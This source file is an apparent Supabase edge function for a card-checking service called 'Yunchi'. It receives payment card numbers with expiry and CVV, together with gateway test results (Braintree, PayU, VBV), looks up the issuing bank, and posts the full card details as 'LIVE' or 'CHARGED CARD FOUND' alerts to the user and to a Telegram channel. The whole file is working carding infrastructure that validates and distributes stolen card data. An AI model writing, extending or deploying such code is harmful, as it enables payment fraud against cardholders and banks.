import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { sendTelegramAnimation } from "../_shared/telegram-helpers.ts";
import { lookupBin, getCountryFlag, getBrandEmoji } from "../_shared/bin-helpers.ts";
import { getRandomAnimeGif } from "../_shared/gif-helpers.ts";
import { toFancyBold, toFancyItalic, toFancyScript } from "../_shared/unicode-helpers.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const LIVE_CARDS_CHANNEL_ID = "-1003762273256";
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

interface ChargedCardRequest {
  user_id: string;
  card_details: string;
  status: "CHARGED" | "DECLINED" | "UNKNOWN";
  response_message: string;
  amount: string;
  gateway: string;
  api_response?: string;
  screenshot_url?: string;
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestData: ChargedCardRequest = await req.json();
    const { user_id, card_details, status, response_message, amount, gateway } = requestData;

    console.log("[NOTIFY-CHARGED] Processing notification:", { user_id, status, gateway });

    if (!user_id || !card_details || !status) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Skip non-charged statuses
    if (status === "UNKNOWN" || status === "DECLINED") {
      console.log(`[NOTIFY-CHARGED] ${status} status - skipping user notification`);
      return new Response(
        JSON.stringify({ success: true, type: `${status.toLowerCase()}_skipped` }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    const { data: profile, error: profileError } = await supabase
      .from('profiles')
      .select('telegram_chat_id, username')
      .eq('user_id', user_id)
      .single();

    if (profileError || !profile?.telegram_chat_id) {
      console.log("User has no Telegram chat ID linked:", user_id);
      return new Response(
        JSON.stringify({ success: false, reason: 'No Telegram linked' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Parse card details
    const [cardNum, mm, yy, cvv] = card_details.split('|');
    const bin = cardNum?.slice(0, 6) || '';

    // Lookup BIN information
    const binInfo = await lookupBin(bin);
    const countryFlag = getCountryFlag(binInfo.countryCode);
    const brandEmoji = getBrandEmoji(binInfo.brand);

    const timeNow = new Date().toISOString().replace('T', ' ').slice(0, 16);
    const randomGif = await getRandomAnimeGif();
    
    // Determine gateway type for status display
    const isVbvGateway = gateway.toLowerCase().includes('vbv');
    const isAuthGateway = gateway.toLowerCase().includes('auth') || 
                          gateway.toLowerCase().includes('yunchi auth') ||
                          gateway.toLowerCase().includes('braintree');
    const isChargeGateway = gateway.toLowerCase().includes('payu') || 
                            gateway.toLowerCase().includes('paygate');
    
    const statusLabel = isVbvGateway ? 'PASSED' : (isChargeGateway ? 'CHARGED' : (isAuthGateway ? 'LIVE' : 'CHARGED'));
    const statusLine = isVbvGateway
      ? `✅ ${toFancyBold('PASSED')}`
      : (isChargeGateway 
        ? `✅ ${toFancyBold('CHARGED')} • 💰 ${amount}`
        : (isAuthGateway ? `✅ ${toFancyBold('LIVE')}` : `✅ ${toFancyBold('CHARGED')} • 💰 ${amount}`));
    
    const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;
    
    // User message
    const message = `🔥 ${toFancyBold(statusLabel + ' CARD FOUND')} 🔥

${toFancyScript('Card')} ▸ <code>${fullCard}</code>

${statusLine}
${toFancyScript('Response')} ▸ <code>${response_message}</code>

${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
🏦 ${binInfo.bank}
⭐ ${binInfo.level} • ${countryFlag} ${binInfo.country}

⚡ ${gateway} • 🕐 ${timeNow}

${toFancyScript('Yunchi')} ⚡`.trim();

    // Channel message
    const username = profile.username || 'Anonymous';
    const channelMessage = `🔥 ${toFancyBold(statusLabel + ' CARD')} 🔥

${toFancyScript('Card')} ▸ <code>${fullCard}</code>

${statusLine}

━━━━━━ 𝗕𝗜𝗡 𝗜𝗡𝗙𝗢 ━━━━━━
${brandEmoji} ${toFancyBold('Brand')}: ${binInfo.brand}
💳 ${toFancyBold('Type')}: ${binInfo.type}
⭐ ${toFancyBold('Level')}: ${binInfo.level}
🏦 ${toFancyBold('Bank')}: ${binInfo.bank}
${countryFlag} ${toFancyBold('Country')}: ${binInfo.country}
━━━━━━━━━━━━━━━━━━━━

⚡ ${gateway} • 👤 @${username}
🕐 ${timeNow}

${toFancyScript('Yunchi')} ⚡`.trim();

    // Send notification to user
    const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, message);
    
    // Check if should skip channel broadcast
    let sentToChannel = false;
    const skipBroadcast = gateway.toLowerCase().includes('vbv') || gateway.toLowerCase().includes('killer');
    
    if (skipBroadcast) {
      console.log("[NOTIFY-CHARGED] Skipping channel broadcast for excluded gateway:", gateway);
    } else {
      // Generate card hash for duplicate detection
      const cardHash = await crypto.subtle.digest(
        'SHA-256',
        new TextEncoder().encode(cardNum)
      ).then(buf => Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join(''));
      
      // Check for duplicate within last 24 hours
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      const { data: existingBroadcast } = await supabase
        .from('broadcasted_cards')
        .select('id')
        .eq('card_hash', cardHash)
        .gte('created_at', twentyFourHoursAgo)
        .limit(1);
      
      if (existingBroadcast && existingBroadcast.length > 0) {
        console.log("[NOTIFY-CHARGED] Skipping duplicate broadcast for card hash:", cardHash.slice(0, 8) + "...");
      } else {
        // Record this broadcast
        await supabase.from('broadcasted_cards').insert({
          card_hash: cardHash,
          gateway: gateway,
          user_id: user_id
        });
        
        const channelGif = await getRandomAnimeGif();
        console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID);
        sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, channelMessage);
      }
    }

    return new Response(
      JSON.stringify({ success: sentToUser, channelBroadcast: sentToChannel, channel: LIVE_CARDS_CHANNEL_ID }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[NOTIFY-CHARGED] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
